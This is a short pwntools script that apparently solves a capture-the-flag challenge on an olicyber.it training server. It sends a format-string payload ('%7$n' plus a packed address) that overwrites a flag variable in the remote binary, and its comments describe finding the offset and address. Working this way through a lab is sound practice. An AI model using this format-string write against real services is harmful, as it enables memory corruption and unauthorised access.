from pwn import *

HOST = "formatted.challs.olicyber.it"
PORT = 10305

# objdump -t formatted | grep flag 
# it is used to find the address of the flag global variable in the binary

s = remote(HOST, PORT)

data = s.recvline()

#s.sendline(b"AAAA%6$p") found offset 6
s.sendline(b'A%7$nAAA' + p64(0x40404c)) # 0x40404c is the address of the flag global variable in the binary

data = s.recv()
print(data)

